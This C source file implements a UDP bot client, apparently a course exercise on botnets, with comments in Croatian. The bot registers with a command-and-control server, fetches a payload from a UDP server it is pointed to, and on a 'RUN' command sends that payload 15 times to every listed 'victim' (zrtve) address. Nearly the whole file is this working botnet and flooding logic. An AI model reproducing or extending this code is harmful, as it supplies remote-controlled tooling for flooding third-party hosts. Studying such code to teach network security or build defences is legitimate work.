#include<err.h>
#include<string.h>
#include<stdio.h>
#include<stdlib.h>
#include<netdb.h>
#include<arpa/inet.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<unistd.h>
#include<netinet/in.h>
#include<errno.h>
#include "bot.h"

#define PROG '0'
#define RUN '1'
#define MAX_MESSAGE_LENGTH 512
#define MAX_PAIRS 20


int Socket(int family, int type, int protocol){
		int succ=socket(family, type, protocol);
		char *error;
		if(succ < 0){
				error=strerror(errno);
				printf("%s\n", error);
		} 
		return succ;
		
}

int Getaddrinfo(const char *host, const char *server, const struct addrinfo *hints,
				struct addrinfo **res){
		int succ=getaddrinfo(host, server, hints, res);
		char *error;
		if(succ){
			error=strerror(errno);
			printf("%s\n", error);	
		}
		return succ;
		
}

int Sendto(int sockfd, void *buff, size_t nbytes, int flags, const struct sockaddr* to, socklen_t addrlen){
		int succ=sendto(sockfd, buff, nbytes, flags, to, addrlen);
		if(succ!=nbytes){
				printf("sendto error %d, nbytes is %d errno %d\n", succ, nbytes, errno);
				errx(2, "%s", strerror(errno));
		}
		return succ;
}	

int Recvfrom(int sock_fd,  message_from_cc *msg, size_t nbytes, int flags, struct sockaddr* from, socklen_t *fromaddrlen){
		int recieved = recvfrom(sock_fd, msg, nbytes, 0, NULL, 0);
		if(recieved <0){
				printf("recvfrom dod not recieve messages\n");
				exit(2);
		}
		return recieved;
}

int RecvfromChar(int sock_fd,  char *msg, size_t nbytes, int flags, struct sockaddr* from, socklen_t *fromaddrlen){
		int recieved = recvfrom(sock_fd, msg, nbytes, 0, NULL, 0);
		if(recieved <0){
				printf("recvfrom dod not recieve messages\n");
				exit(2);
		}
		return recieved;
}


int main(int argc, char *argv[]){
	
		int cc_sockfd, zrtve_sockfd, udp_sockfd;
		
		struct addrinfo hints, *res;
		
		//char payload[MAX_MESSAGE_LENGTH +9];
		char payload[MAX_MESSAGE_LENGTH +1];

		payload[0]='\0';
	
		if(argc<3){
				printf("Usage: %s server_ip server_port", argv[0]);
				exit(-1);
		}
		
		memset(&hints, 0, sizeof(hints));
		
		hints.ai_family=AF_INET;
		hints.ai_socktype=SOCK_DGRAM;
		hints.ai_flags=AI_PASSIVE;
		
		Getaddrinfo(argv[1], argv[2], &hints, &res);
		
		udp_sockfd = Socket(PF_INET, SOCK_DGRAM, 0);
		zrtve_sockfd = Socket(PF_INET, SOCK_DGRAM, 0);
		cc_sockfd = Socket(res->ai_family, res->ai_socktype, res->ai_protocol);
		
		struct sockaddr_in res2;
		memcpy(&res2, res->ai_addr, sizeof(res2));
			
		printf("getting ready to send...\n");
		//salji podatak REG\n na adresu koja je upisana u resultu
		Sendto(cc_sockfd, "REG\n", strlen("REG\n"), 0, (struct sockaddr*) &res2, sizeof(struct sockaddr_in));
		printf("sending...\n");
		while(1){
				int pairs, recieved, command;
				message_from_cc msg;
							
				//cekaj na komandu od cc-a
				recieved = Recvfrom(cc_sockfd, &msg, sizeof(message_from_cc), 0, NULL, 0);
				printf("Running command %c, received %d bytes\n\n", msg.command, recieved);
				
				recieved--;
				
				//koliko parova adresa je primljeno
				recieved=recieved/sizeof(addresses_from_cc);
				
				//u ovoj fazi primit cemo samo jedan par i to adresu UDP_servera
				pairs=recieved;
				
				command=msg.command;
				
				if(command==PROG){
						struct addrinfo hints, *res;
						char payload_recieved[MAX_MESSAGE_LENGTH+9];
						int bytes_recieved;
						
						memset(&hints, 0, sizeof(hints));
						hints.ai_family=PF_INET;
						hints.ai_socktype=SOCK_DGRAM;
						hints.ai_flags=AI_PASSIVE;
						
						addresses_from_cc udpserver=msg.pairs[0];
						
						Getaddrinfo(udpserver.ip, udpserver.port, &hints, &res);
						
						struct sockaddr_in res2;
						memcpy(&res2, res->ai_addr, sizeof(res2));
						Sendto(udp_sockfd, "HELLO", strlen("HELLO"), 0, (struct sockaddr*) &res2, sizeof(struct sockaddr_in));
						
						//cekaj da ti UDP_server posalje payload
						bytes_recieved = RecvfromChar(udp_sockfd, payload_recieved, MAX_MESSAGE_LENGTH, 0, NULL, 0);
						strncpy(payload, payload_recieved+8, bytes_recieved-8-1);
						payload[bytes_recieved - 9]='\0';
						//payload[bytes_recieved-1]='\0';
						printf("payload: \'%s\'\n", payload);
			
						
				} else if(command==RUN){
						int sent, pair;
						for(sent=0; sent<15; ++sent){
								for(pair=0; pair<pairs; pair++){
										struct addrinfo hints, *res;
										addresses_from_cc to; 
										
										memset(&hints, 0, sizeof(hints));
										hints.ai_family=PF_INET;
										hints.ai_socktype=SOCK_DGRAM;
										hints.ai_flags=AI_PASSIVE;
										
										to = msg.pairs[pair];
										Getaddrinfo(to.ip, to.port, &hints, &res);
										struct sockaddr_in res2;
										memcpy(&res2, res->ai_addr, sizeof(res2));
										Sendto(zrtve_sockfd, payload, strlen(payload), 0, (struct sockaddr*) &res2, sizeof(struct sockaddr_in));
										
								}
								printf("bot sent payload %s to all victims\n", payload);
								sleep(1);	
						}
				} else {
						printf("invalid command: %d\n", command);
						exit(2);
				}
		}
		return 0;
}
